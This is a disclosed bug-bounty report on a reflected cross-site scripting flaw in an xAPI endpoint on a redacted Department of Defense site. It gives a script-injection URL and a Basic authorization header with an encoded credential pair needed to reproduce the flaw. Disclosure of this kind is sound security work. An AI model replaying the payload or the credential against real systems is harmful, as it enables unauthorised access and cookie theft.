# XSS on ( █████████.gov ) Via URL path

## Report Details
- **Report ID**: 1825942
- **URL**: https://hackerone.com/reports/1825942
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-01-08T06:35:55.700Z
- **Disclosed**: 2023-01-27T18:36:36.969Z

## Reporter
- **Username**: notajax
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi team,
I was able to execute XSS on  ███████.gov  

Steps to produce - 
1 -Turn on the burp intercepter 
2- Go to  https://██████.gov/xapi/statements?file"><script>alert(document.domain)</script>
3-  In  Intercepter add the following Headers 

  Authorization: Basic eGFwaS10b29sczp4YXBpLXRvb2xz
   X-Experience-Api-Version: 1.0.1

4-  when you send this GET request you will receive a response with XSS payload executed.

## Impact

An attacker can send the malicious link to victims and steals victims' cookie leading to account takeover.

## System Host(s)
www.███.gov

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2021-41878

## Steps to Reproduce
I have attached the Video POC, please check it out.

## Suggested Mitigation/Remediation Actions
sanitize the inputs in the URL



## Attachments
No attachments
